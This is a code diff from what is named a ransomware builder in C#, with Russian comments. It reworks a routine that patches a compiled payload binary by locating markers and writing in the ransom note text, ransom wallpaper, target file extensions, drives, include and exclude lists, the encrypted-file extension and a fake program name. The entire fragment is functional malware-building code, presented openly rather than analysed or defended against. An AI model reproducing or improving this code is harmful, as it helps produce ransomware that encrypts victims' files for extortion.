@@ -767,54 +767,71 @@ namespace RansomwareBuilder
         // ПАТЧИНГ БИНАРНИКА
         // ============================================================
         private void PatchBinary(byte[] data, string marker, string value)
+{
+    byte[] markerBytes = Encoding.UTF8.GetBytes(marker);
+    byte[] valueBytes = Encoding.UTF8.GetBytes(value + "\0");
+    
+    for (int i = 0; i < data.Length - markerBytes.Length; i++)
+    {
+        bool found = true;
+        for (int j = 0; j < markerBytes.Length; j++)
         {
-            byte[] markerBytes = Encoding.UTF8.GetBytes(marker);
-            byte[] valueBytes = Encoding.UTF8.GetBytes(value + "\0");
-            
-            for (int i = 0; i < data.Length - markerBytes.Length; i++)
-            {
-                bool found = true;
-                for (int j = 0; j < markerBytes.Length; j++)
-                {
-                    if (data[i + j] != markerBytes[j]) { found = false; break; }
-                }
-                if (found)
-                {
-                    int start = i + markerBytes.Length;
-                    int maxLen = 0;
-                    
-                    // Ищем размер буфера до следующего маркера
-                    for (int k = start; k < data.Length; k++)
-                    {
-                        if (k + 4 < data.Length && data[k] == '|' && data[k+1] == '|')
-                            break;
-                        maxLen++;
-                    }
-                    
-                    if (maxLen == 0)
-                    {
-                        // Если не нашли следующий маркер, используем размер по умолчанию
-                        if (marker.Contains("WALLPAPER_BASE64")) maxLen = 16384;
-                        else if (marker.Contains("NOTE_CONTENT")) maxLen = 4096;
-                        else if (marker.Contains("EXTS")) maxLen = 2048;
-                        else if (marker.Contains("EXCLUDE") || marker.Contains("INCLUDE")) maxLen = 1024;
-                        else if (marker.Contains("DRIVES")) maxLen = 512;
-                        else if (marker.Contains("NOTE_NAME") || marker.Contains("FAKE_NAME")) maxLen = 64;
-                        else if (marker.Contains("ENC_EXT") || marker.Contains("WALLPAPER_EXT")) maxLen = 32;
-                        else maxLen = 256;
-                    }
-                    
-                    int copyLen = Math.Min(valueBytes.Length, maxLen);
-                    Array.Copy(valueBytes, 0, data, start, copyLen);
-                    
-                    // Обнуляем остаток
-                    for (int k = start + copyLen; k < start + maxLen; k++)
-                        data[k] = 0;
-                    
-                    return;
-                }
-            }
+            if (data[i + j] != markerBytes[j]) { found = false; break; }
         }
+        if (found)
+        {
+            int start = i + markerBytes.Length;
+            int maxLen = 0;
+            
+            // ============================================================
+            // Ищем следующий маркер (по символу '|' в начале)
+            // ============================================================
+            for (int k = start; k < data.Length; k++)
+            {
+                // Если нашли символ '|' — это может быть начало маркера
+                if (data[k] == '|')
+                {
+                    // Проверяем, что это действительно маркер (не часть данных)
+                    // Маркеры всегда начинаются с '|' и заканчиваются '|'
+                    // Например: |DRIVES|, |EXTS|, |ENC_EXT|
+                    int end = k + 1;
+                    while (end < data.Length && data[end] != '|')
+                        end++;
+                    if (end < data.Length && data[end] == '|' && end - k > 2)
+                    {
+                        // Это маркер
+                        break;
+                    }
+                }
+                maxLen++;
+            }
+            
+            // ============================================================
+            // ЖЕСТКИЕ РАЗМЕРЫ (если не нашли следующий маркер)
+            // ============================================================
+            if (maxLen == 0 || maxLen > 16384)
+            {
+                if (marker.Contains("WALLPAPER_BASE64")) maxLen = 16384;
+                else if (marker.Contains("NOTE_CONTENT")) maxLen = 4096;
+                else if (marker.Contains("EXTS")) maxLen = 2048;
+                else if (marker.Contains("EXCLUDE") || marker.Contains("INCLUDE")) maxLen = 1024;
+                else if (marker.Contains("DRIVES")) maxLen = 512;
+                else if (marker.Contains("NOTE_NAME") || marker.Contains("FAKE_NAME")) maxLen = 64;
+                else if (marker.Contains("ENC_EXT") || marker.Contains("WALLPAPER_EXT")) maxLen = 32;
+                else maxLen = 256;
+            }
+            
+            int copyLen = Math.Min(valueBytes.Length, maxLen);
+            Array.Copy(valueBytes, 0, data, start, copyLen);
+            
+            // Обнуляем остаток
+            for (int k = start + copyLen; k < start + maxLen; k++)
+                data[k] = 0;
+            
+            return;
+        }
+    }
+}
         
         // ============================================================
         // ОСНОВНАЯ ЛОГИКА СБОРКИ
